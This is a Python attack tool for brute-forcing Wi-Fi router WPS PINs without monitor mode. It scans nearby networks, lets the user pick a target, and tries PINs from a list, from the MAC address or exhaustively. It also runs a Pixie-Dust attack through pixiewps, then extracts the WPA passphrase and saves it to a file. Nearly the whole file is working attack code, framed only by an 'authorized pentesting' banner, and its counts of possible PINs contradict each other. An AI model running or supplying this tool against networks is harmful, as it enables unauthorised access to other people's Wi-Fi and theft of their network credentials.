#!/usr/bin/env python3
"""
WPS PIN Brute-Forcer — No monitor mode required.
Uses wpa_supplicant's built-in WPS registrar protocol.

Works on: Linux, macOS, Termux (Android with root)
Dependencies: wpa_supplicant, Python 3.6+
Root required: YES (to control wireless interface)

On Termux Android:
    pkg install wpa-supplicant tsu iw pixiewps
    tsu
    python3 wps_pin_brute.py -i wlan0 -b AA:BB:CC:DD:EE:FF -p pinlist.txt

Authorized pentesting only.
"""

import argparse
import subprocess
import sys
import os
import tempfile
import shutil
import time
import re
import signal
import json
from datetime import datetime
from pathlib import Path

# ──────────────────────────────────────────────
# Color codes
# ──────────────────────────────────────────────
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
W = "\033[97m"
N = "\033[0m"
BOLD = "\033[1m"

# ──────────────────────────────────────────────
# Helper functions
# ──────────────────────────────────────────────
def banner():
    print(f"""{C}
  ╔═══════════════════════════════════════════╗
  ║      WPS PIN Brute-Forcer v2.0           ║
  ║   No monitor mode needed (wpa_supplicant) ║
  ║   Authorized security testing only        ║
  ╚═══════════════════════════════════════════╝{N}
    """)

def check_root():
    if os.geteuid() != 0:
        print(f"{R}[!] Must run as root. Use: sudo python3 {sys.argv[0]}{N}")
        sys.exit(1)

def check_tool(tool):
    """Check if a tool is available on PATH."""
    try:
        subprocess.run(["which", tool], capture_output=True, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

def run_cmd(cmd, timeout=30, check=False):
    """Run a shell command and return (returncode, stdout, stderr)."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", f"Command timed out after {timeout}s"
    except Exception as e:
        return -2, "", str(e)

def interface_up(iface):
    """Bring the wireless interface up."""
    run_cmd(f"ip link set {iface} up", timeout=5)
    run_cmd(f"iw dev {iface} set power_save off", timeout=5, check=False)
    time.sleep(0.5)

def interface_down(iface):
    """Bring the wireless interface down."""
    run_cmd(f"ip link set {iface} down", timeout=5)

def check_interface_exists(iface):
    """Check if the wireless interface exists."""
    code, out, _ = run_cmd(f"iw dev {iface} info", timeout=5, check=False)
    return code == 0

def wifi_scan(iface):
    """Scan for nearby Wi-Fi networks using iw."""
    code, out, _ = run_cmd(f"iw dev {iface} scan", timeout=15, check=False)
    networks = []
    if code != 0:
        return networks
    
    current = {}
    for line in out.split('\n'):
        line = line.strip()
        if line.startswith('BSS '):
            if current:
                networks.append(current)
            current = {'BSSID': line.split()[1], 'ESSID': '', 'Channel': '', 'Signal': ''}
        elif 'SSID:' in line:
            current['ESSID'] = line.split('SSID:')[-1].strip().strip('"')
        elif 'freq:' in line:
            freq = int(line.split()[1])
            # Convert frequency to channel
            if 2412 <= freq <= 2484:
                current['Channel'] = str((freq - 2412) // 5 + 1)
            elif 5180 <= freq <= 5825:
                current['Channel'] = str((freq - 5180) // 5 + 36)
        elif 'signal:' in line:
            parts = line.split()
            for i, p in enumerate(parts):
                if p == 'signal:':
                    current['Signal'] = parts[i+1].split('.')[0]
    
    if current:
        networks.append(current)
    
    # Remove duplicates by BSSID
    seen = set()
    unique = []
    for n in networks:
        if n['BSSID'] not in seen:
            seen.add(n['BSSID'])
            unique.append(n)
    
    return unique

def scan_and_select_target(iface):
    """Scan for networks and let user select a target."""
    print(f"{B}[*] Scanning for Wi-Fi networks on {iface}...{N}")
    networks = wifi_scan(iface)
    
    if not networks:
        print(f"{Y}[!] No networks found. Make sure Wi-Fi is enabled.{N}")
        return None, None
    
    print(f"\n{G}[+] Found {len(networks)} network(s):{N}")
    print(f"{'─' * 70}")
    for i, net in enumerate(networks, 1):
        sig = net.get('Signal', '?')
        ch = net.get('Channel', '?')
        essid = net.get('ESSID', '<hidden>')[:25]
        print(f"  {i:2d}. {essid:<25} {net['BSSID']:>17}  Ch:{ch:<4}  Sig:{sig} dBm")
    print(f"{'─' * 70}")
    
    while True:
        try:
            choice = input(f"\n{B}[?] Select target (1-{len(networks)}): {N}").strip()
            idx = int(choice) - 1
            if 0 <= idx < len(networks):
                target = networks[idx]
                return target['BSSID'], target.get('ESSID', '<hidden>')
        except (ValueError, IndexError):
            pass
        print(f"{R}Invalid selection.{N}")

# ──────────────────────────────────────────────
# WPS PIN Attack via wpa_supplicant
# ──────────────────────────────────────────────
class WPSBruteforcer:
    def __init__(self, interface, bssid, essid="<unknown>", verbose=False):
        self.interface = interface
        self.bssid = bssid.upper()
        self.essid = essid
        self.verbose = verbose
        self.tempdir = None
        self.tempconf = None
        self.wpas_process = None
        self.ctrl_socket = None
        self.pin_found = None
        self.psk_found = None
        
    def _create_wpa_config(self):
        """Create a temporary wpa_supplicant configuration with WPS support."""
        self.tempdir = tempfile.mkdtemp()
        ctrl_path = os.path.join(self.tempdir, "wpa_ctrl")
        
        config_content = (
            f"ctrl_interface={ctrl_path}\n"
            f"ctrl_interface_group=0\n"
            f"update_config=1\n"
            f"device_name=WPSBruteForcer\n"
            f"manufacturer=HackerAI\n"
            f"model_name=Linux\n"
            f"model_number=1.0\n"
            f"serial_number=12345\n"
            f"device_type=6-0050F204-1\n"
            f"os_version=01020300\n"
            f"config_methods=label push_button keypad\n"
            f"wps_cred_processing=2\n"
        )
        
        with tempfile.NamedTemporaryFile(
            mode='w', suffix='.conf', delete=False
        ) as f:
            f.write(config_content)
            self.tempconf = f.name
        
        return ctrl_path
    
    def start_wpa_supplicant(self):
        """Start wpa_supplicant in the background."""
        if not check_tool("wpa_supplicant"):
            print(f"{R}[!] wpa_supplicant not found. Install it first.{N}")
            print(f"{Y}    Debian/Ubuntu: apt install wpasupplicant{N}")
            print(f"{Y}    Termux Android: pkg install wpa-supplicant{N}")
            return False
        
        # Kill any existing wpa_supplicant on this interface
        run_cmd(f"pkill -f 'wpa_supplicant.*{self.interface}'", timeout=5, check=False)
        time.sleep(1)
        
        ctrl_path = self._create_wpa_config()
        
        cmd = (
            f"wpa_supplicant -B -K -Dnl80211,wext "
            f"-i {self.interface} -c {self.tempconf} "
            f"-f /tmp/wps_brute_{self.interface}.log 2>&1"
        )
        
        if self.verbose:
            print(f"{B}[*] Starting wpa_supplicant...{N}")
            print(f"    {cmd}")
        
        code, out, err = run_cmd(cmd, timeout=10, check=False)
        
        if code != 0:
            print(f"{R}[!] Failed to start wpa_supplicant.{N}")
            print(f"    {err[:200] if err else out[:200]}")
            self.cleanup()
            return False
        
        time.sleep(1.5)  # Wait for supplicant to initialize
        print(f"{G}[+] wpa_supplicant started successfully{N}")
        return True
    
    def try_pin(self, pin):
        """
        Attempt a WPS PIN against the target BSSID.
        Returns: (success, wifi_psk_or_error_msg)
        """
        if not check_tool("wpa_cli"):
            return False, "wpa_cli not found"
        
        # Use wpa_cli to try the WPS PIN
        cmd = (
            f"wpa_cli -i {self.interface} wps_pin "
            f"{self.bssid} {pin} 2>&1"
        )
        
        if self.verbose:
            print(f"      Trying PIN: {pin}")
        
        code, out, err = run_cmd(cmd, timeout=10, check=False)
        
        # Check for failure modes
        if "FAIL" in out or "FAIL" in err:
            return False, out.strip() or err.strip()
        
        if "OK" in out:
            # PIN accepted by registrar — wait for WPS negotiation to complete
            return self._wait_for_wps_completion(pin)
        
        return False, out.strip()[:100]
    
    def _wait_for_wps_completion(self, pin, timeout=30):
        """
        After a PIN is accepted, wait for the full WPS handshake and
        check if we got the PSK.
        """
        # Wait for WPS negotiation
        time.sleep(2)
        
        # Check wpa_supplicant log for WPS success
        logfile = f"/tmp/wps_brute_{self.interface}.log"
        
        start_time = time.time()
        while time.time() - start_time < timeout:
            time.sleep(1)
            
            # Read the wpa_supplicant log
            try:
                with open(logfile, 'r') as f:
                    log_content = f.read()
            except (FileNotFoundError, IOError):
                log_content = ""
            
            # Check for WPS success
            if "WPS: AP provided credentials" in log_content:
                # Extract the PSK
                psk_match = re.search(
                    r'psk=(?:"[^"]*"|[0-9a-fA-F]{64})', log_content
                )
                if psk_match:
                    psk_val = psk_match.group(0).split('=')[1].strip('"')
                    self.pin_found = pin
                    self.psk_found = psk_val
                    return True, psk_val
                
                # Try another pattern
                psk_match = re.search(r'WPA PSK[:\s]+["\']?([^"\'\\\n]+)', log_content)
                if psk_match:
                    self.pin_found = pin
                    self.psk_found = psk_match.group(1).strip()
                    return True, self.psk_found
            
            # Check if WPS negotiation failed
            if "WPS: negotiation failed" in log_content.lower():
                return False, "WPS negotiation failed"
            
            if "WPS: M8" in log_content:
                # M8 received, credentials should be coming
                time.sleep(2)
                try:
                    with open(logfile, 'r') as f:
                        log_content = f.read()
                except (FileNotFoundError, IOError):
                    pass
                
                psk_match = re.search(r'psk=(?:"[^"]*"|[0-9a-fA-F]{64})', log_content)
                if psk_match:
                    psk_val = psk_match.group(0).split('=')[1].strip('"')
                    self.pin_found = pin
                    self.psk_found = psk_val
                    return True, psk_val
        
        # Check with wpa_cli if we have any networks configured
        code, out, _ = run_cmd(
            f"wpa_cli -i {self.interface} list_networks", timeout=5, check=False
        )
        if code == 0 and self.bssid[:8].lower() in out.lower():
            # Possibly got credentials
            code2, out2, _ = run_cmd(
                f"wpa_cli -i {self.interface} list_networks", timeout=5, check=False
            )
            # Try to extract PSK
            if code2 == 0:
                psk_match = re.search(r'psk=[0-9a-fA-F]{64}', out2)
                if psk_match:
                    self.pin_found = pin
                    self.psk_found = psk_match.group(0).split('=')[1]
                    return True, self.psk_found
        
        return False, "WPS handshake timeout"
    
    def cleanup(self):
        """Clean up wpa_supplicant and temp files."""
        if self.wpas_process:
            self.wpas_process.terminate()
            self.wpas_process = None
        
        # Kill wpa_supplicant
        run_cmd(f"pkill -f 'wpa_supplicant.*{self.interface}'", timeout=5, check=False)
        
        # Remove temp files
        if self.tempdir:
            shutil.rmtree(self.tempdir, ignore_errors=True)
        if self.tempconf:
            try:
                os.remove(self.tempconf)
            except OSError:
                pass
        
        time.sleep(0.5)
    
    def __enter__(self):
        return self
    
    def __exit__(self, *args):
        self.cleanup()


# ──────────────────────────────────────────────
# PIN Generation Utilities
# ──────────────────────────────────────────────
def generate_computrace_pins(bssid):
    """
    Generate Computrace (default) WPS PINs from BSSID.
    Many routers use algorithms that derive the PIN from the MAC.
    """
    pins = []
    clean_bssid = bssid.replace(':', '').upper()
    
    # Arcadyan / some ZyXEL: last 4 hex bytes converted to decimal
    if len(clean_bssid) >= 12:
        # Simple: last 7 hex digits as decimal, then checksum
        try:
            hex_part = clean_bssid[-7:]
            raw_pin = int(hex_part, 16) % 10000000
            pin_str = f"{raw_pin:07d}"
            # WPS checksum digit
            accum = 0
            for i, c in enumerate(pin_str):
                d = int(c)
                if i % 2 == 0:
                    accum += 3 * d
                else:
                    accum += d
            checksum = (10 - (accum % 10)) % 10
            pins.append(pin_str + str(checksum))
        except ValueError:
            pass
    
    return pins


def load_pin_list(pin_file):
    """
    Load PINs from a text file.
    Format: one PIN per line, 8 digits each.
    Lines starting with # are ignored.
    """
    pins = []
    try:
        with open(pin_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                # Extract 8-digit PINs
                found = re.findall(r'\b(\d{8})\b', line)
                pins.extend(found)
    except FileNotFoundError:
        print(f"{R}[!] PIN file not found: {pin_file}{N}")
        return []
    
    # Remove duplicates, preserve order
    seen = set()
    unique = []
    for p in pins:
        if p not in seen:
            seen.add(p)
            unique.append(p)
    
    return unique


def compute_wps_checksum(pin_prefix_7):
    """
    Compute the 8th WPS checksum digit from a 7-digit prefix.
    WPS PIN format: d1 d2 d3 d4 d5 d6 d7 C
    Where C = (10 - (3*d1 + d2 + 3*d3 + d4 + 3*d5 + d6 + 3*d7) % 10) % 10
    """
    if len(pin_prefix_7) != 7:
        return None
    accum = 0
    for i, c in enumerate(pin_prefix_7):
        d = int(c)
        if i % 2 == 0:
            accum += 3 * d
        else:
            accum += d
    checksum = (10 - (accum % 10)) % 10
    return str(checksum)


def generate_all_pins():
    """
    Generate all 11,000 possible WPS PINs (0000000-9999999 + checksum).
    """
    pins = []
    for prefix in range(10000000):
        pin_prefix = f"{prefix:07d}"
        checksum = compute_wps_checksum(pin_prefix)
        if checksum:
            pins.append(pin_prefix + checksum)
            if len(pins) % 1000 == 0:
                print(f"{Y}    Generated {len(pins)}/{10000000} PINs...{N}", end='\r')
    print()
    return pins


# ──────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────
def main():
    banner()
    check_root()
    
    parser = argparse.ArgumentParser(
        description="WPS PIN Brute-Forcer (no monitor mode)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan and select a target, then brute-force from file
  sudo python3 %(prog)s -i wlan0 -p pins.txt
  
  # Target specific BSSID with multiple PIN files
  sudo python3 %(prog)s -i wlan0 -b AA:BB:CC:DD:EE:FF -p pins.txt
  
  # Use Pixie mode (extracts PIN via Pixie-Dust, needs pixiewps)
  sudo python3 %(prog)s -i wlan0 -b AA:BB:CC:DD:EE:FF --pixie
  
  # Generate default PINs from BSSID algorithm
  sudo python3 %(prog)s -i wlan0 -b AA:BB:CC:DD:EE:FF --generate
  
  # Full brute-force (all ~11,000 PINs - takes hours)
  sudo python3 %(prog)s -i wlan0 -b AA:BB:CC:DD:EE:FF --full
  
  # Try a single PIN
  sudo python3 %(prog)s -i wlan0 -b AA:BB:CC:DD:EE:FF --pin 12345670
        """
    )
    
    parser.add_argument("-i", "--interface", required=True,
                        help="Wireless interface name (e.g. wlan0)")
    parser.add_argument("-b", "--bssid",
                        help="Target BSSID (MAC address). If omitted, scans first.")
    parser.add_argument("-p", "--pinfile",
                        help="File containing PINs to try (one per line)")
    parser.add_argument("--pin", 
                        help="Try a single PIN")
    parser.add_argument("--pixie", action="store_true",
                        help="Run Pixie-Dust attack (requires pixiewps)")
    parser.add_argument("--generate", action="store_true",
                        help="Generate default PINs from BSSID algorithm")
    parser.add_argument("--full", action="store_true",
                        help="Full brute-force (all 11M combos, ~10 hours)")
    parser.add_argument("--delay", type=float, default=2.0,
                        help="Delay between PIN attempts in seconds (default: 2.0)")
    parser.add_argument("--timeout", type=int, default=15,
                        help="Timeout per PIN attempt in seconds (default: 15)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")
    
    args = parser.parse_args()
    
    # Check dependencies
    if not check_tool("wpa_supplicant"):
        print(f"{R}[!] wpa_supplicant is required.{N}")
        sys.exit(1)
    
    if not check_interface_exists(args.interface):
        print(f"{R}[!] Interface '{args.interface}' not found.{N}")
        print(f"{Y}    Available interfaces:{N}")
        run_cmd("iw dev", timeout=5)
        sys.exit(1)
    
    # Bring interface up
    interface_up(args.interface)
    
    # Get target BSSID
    bssid = args.bssid
    essid = "<unknown>"
    
    if not bssid:
        bssid, essid = scan_and_select_target(args.interface)
        if not bssid:
            interface_down(args.interface)
            sys.exit(1)
        print(f"{G}[+] Selected: {essid} ({bssid}){N}")
    
    bssid = bssid.upper()
    
    # Collect all PINs to try
    pins_to_try = []
    
    if args.pin:
        # Single PIN
        if re.match(r'^\d{8}$', args.pin):
            pins_to_try = [args.pin]
        else:
            print(f"{R}[!] Invalid PIN format. Must be 8 digits.{N}")
            sys.exit(1)
    
    elif args.pinfile:
        pins_to_try = load_pin_list(args.pinfile)
        if not pins_to_try:
            print(f"{R}[!] No valid PINs found in {args.pinfile}{N}")
            sys.exit(1)
        print(f"{G}[+] Loaded {len(pins_to_try)} PINs from {args.pinfile}{N}")
    
    elif args.generate:
        pins_to_try = generate_computrace_pins(bssid)
        print(f"{G}[+] Generated {len(pins_to_try)} default PINs from BSSID{N}")
        for p in pins_to_try:
            print(f"    {p}")
    
    elif args.pixie:
        # Pixie mode — we'll handle this separately below
        pass
    
    elif args.full:
        print(f"{Y}[!] Full brute-force will try all ~11,000,000 PINs.{N}")
        print(f"{Y}    This can take 10+ hours. Continue? (y/N): {N}", end='')
        confirm = input().strip().lower()
        if confirm != 'y':
            print("Aborted.")
            sys.exit(0)
        pins_to_try = generate_all_pins()
    
    else:
        print(f"{R}[!] No attack mode specified. Use -p, --pin, --pixie, --generate, or --full{N}")
        parser.print_help()
        sys.exit(1)
    
    # ── PIXIE MODE ──────────────────────────
    if args.pixie:
        print(f"\n{C}═══ Pixie-Dust Attack Mode ═══{N}")
        if not check_tool("pixiewps"):
            print(f"{R}[!] pixiewps not installed.{N}")
            print(f"{Y}    apt install pixiewps   OR   pkg install pixiewps (Termux){N}")
            sys.exit(1)
        
        # Use the wpa_supplicant approach to capture WPS hashes
        print(f"{B}[*] Connecting to {bssid} to capture WPS handshake data...{N}")
        
        with WPSBruteforcer(args.interface, bssid, essid, args.verbose) as wps:
            if not wps.start_wpa_supplicant():
                sys.exit(1)
            
            # Try a dummy PIN to trigger WPS exchange and capture hashes
            print(f"{B}[*] Initiating WPS handshake with dummy PIN to capture M1-M8 data...{N}")
            
            # The wpa_supplicant log will contain the hashes
            # Start a timeout to read the log while the WPS exchange happens
            logfile = f"/tmp/wps_brute_{args.interface}.log"
            
            # Send dummy WPS PIN
            code, out, _ = run_cmd(
                f"wpa_cli -i {args.interface} wps_pin {bssid} 12345670",
                timeout=10, check=False
            )
            
            if "OK" in out:
                print(f"{G}[+] WPS PIN accepted, waiting for handshake data...{N}")
                time.sleep(5)
                
                # Read log for WPS cryptographic data
                try:
                    with open(logfile, 'r') as f:
                        log_content = f.read()
                except (FileNotFoundError, IOError):
                    log_content = ""
                
                # Extract PKE, PKR, E-Hash1, E-Hash2, AuthKey, E-Nonce
                pke = re.search(r'PKE\s*[:=]\s*([0-9a-fA-F]+)', log_content)
                pkr = re.search(r'PKR\s*[:=]\s*([0-9a-fA-F]+)', log_content)
                e_hash1 = re.search(r'E-Hash1\s*[:=]\s*([0-9a-fA-F]+)', log_content)
                e_hash2 = re.search(r'E-Hash2\s*[:=]\s*([0-9a-fA-F]+)', log_content)
                authkey = re.search(r'AuthKey\s*[:=]\s*([0-9a-fA-F]+)', log_content)
                e_nonce = re.search(r'E-Nonce\s*[:=]\s*([0-9a-fA-F]+)', log_content)
                
                if pke and pkr and e_hash1 and e_hash2 and authkey and e_nonce:
                    pke_val = pke.group(1)
                    pkr_val = pkr.group(1)
                    eh1_val = e_hash1.group(1)
                    eh2_val = e_hash2.group(1)
                    ak_val = authkey.group(1)
                    en_val = e_nonce.group(1)
                    
                    print(f"{G}[+] Captured all WPS handshake data!{N}")
                    if args.verbose:
                        print(f"    PKE:      {pke_val}")
                        print(f"    PKR:      {pkr_val}")
                        print(f"    E-Hash1:  {eh1_val}")
                        print(f"    E-Hash2:  {eh2_val}")
                        print(f"    AuthKey:  {ak_val}")
                        print(f"    E-Nonce:  {en_val}")
                    
                    # Run pixiewps
                    cmd_pixie = (
                        f"pixiewps --pke {pke_val} --pkr {pkr_val} "
                        f"--e-hash1 {eh1_val} --e-hash2 {eh2_val} "
                        f"--authkey {ak_val} --e-nonce {en_val}"
                    )
                    print(f"{B}[*] Running PixieWPS...{N}")
                    if args.verbose:
                        print(f"    {cmd_pixie}")
                    
                    code, pixie_out, _ = run_cmd(cmd_pixie, timeout=60, check=False)
                    print(pixie_out)
                    
                    # Parse PIN from pixiewps output
                    pin_match = re.search(r'\[\+\]\s*WPS PIN:\s*(\d{8})', pixie_out)
                    if pin_match:
                        found_pin = pin_match.group(1)
                        print(f"\n{G}[✔] WPS PIN FOUND: {found_pin}{N}")
                        
                        # Now use the PIN to get the PSK
                        print(f"{B}[*] Using PIN {found_pin} to extract WPA PSK...{N}")
                        success, psk = wps.try_pin(found_pin)
                        if success:
                            print(f"{G}[✔] WPA PSK: {psk}{N}")
                        else:
                            print(f"{Y}[!] Could not extract PSK. PIN is correct though.{N}")
                    else:
                        print(f"{Y}[-] PixieWPS could not compute the PIN.{N}")
                else:
                    print(f"{Y}[-] Could not capture complete WPS handshake data.{N}")
                    if args.verbose:
                        print("    Log content (last 500 chars):")
                        print(f"    {log_content[-500:]}")
            else:
                print(f"{Y}[!] WPS PIN rejected or AP not responding.{N}")
        
        sys.exit(0)
    
    # ── PIN BRUTE-FORCE MODE ──────────────
    if not pins_to_try:
        print(f"{R}[!] No PINs to try.{N}")
        sys.exit(1)
    
    print(f"\n{C}═══ Starting PIN Brute-Force ═══{N}")
    print(f"  Target:     {essid} ({bssid})")
    print(f"  Interface:  {args.interface}")
    print(f"  PINs to try: {len(pins_to_try)}")
    print(f"  Delay:      {args.delay}s")
    print(f"  Timeout:    {args.timeout}s")
    print()
    
    with WPSBruteforcer(args.interface, bssid, essid, args.verbose) as wps:
        if not wps.start_wpa_supplicant():
            sys.exit(1)
        
        try:
            for i, pin in enumerate(pins_to_try, 1):
                print(f"  [{i}/{len(pins_to_try)}] Trying PIN: {pin}", end='', flush=True)
                
                success, result = wps.try_pin(pin)
                
                if success:
                    print(f"\n{G}[✔] SUCCESS!{N}")
                    print(f"{G}{'═' * 60}{N}")
                    print(f"{G}  WPS PIN:  {pin}{N}")
                    print(f"{G}  WPA PSK:  {result}{N}")
                    print(f"{G}  SSID:     {essid}{N}")
                    print(f"{G}  BSSID:    {bssid}{N}")
                    print(f"{G}{'═' * 60}{N}")
                    
                    # Save results
                    result_data = {
                        'bssid': bssid,
                        'essid': essid,
                        'wps_pin': pin,
                        'wpa_psk': result,
                        'timestamp': datetime.now().isoformat(),
                        'interface': args.interface
                    }
                    result_file = f"wps_cracked_{bssid.replace(':', '')}.json"
                    with open(result_file, 'w') as f:
                        json.dump(result_data, f, indent=2)
                    print(f"{B}[*] Results saved to {result_file}{N}")
                    break
                else:
                    print(f"  {Y}[FAIL]{N} ({result[:50]})" if args.verbose else "")
                    if not args.verbose:
                        # Print result inline
                        print(f"\r  [{i}/{len(pins_to_try)}] {pin} {R}✘{N}   ", end='', flush=True)
                        print()  # newline for next attempt
                
                # Delay between attempts (if not the last one)
                if i < len(pins_to_try):
                    time.sleep(args.delay)
            
            else:
                # Loop completed without break
                print(f"\n{Y}[-] No valid PIN found after {len(pins_to_try)} attempts.{N}")
        
        except KeyboardInterrupt:
            print(f"\n{Y}[!] Interrupted by user.{N}")
    
    # Cleanup
    interface_down(args.interface)
    print(f"{G}[+] Done.{N}")


if __name__ == "__main__":
    main()
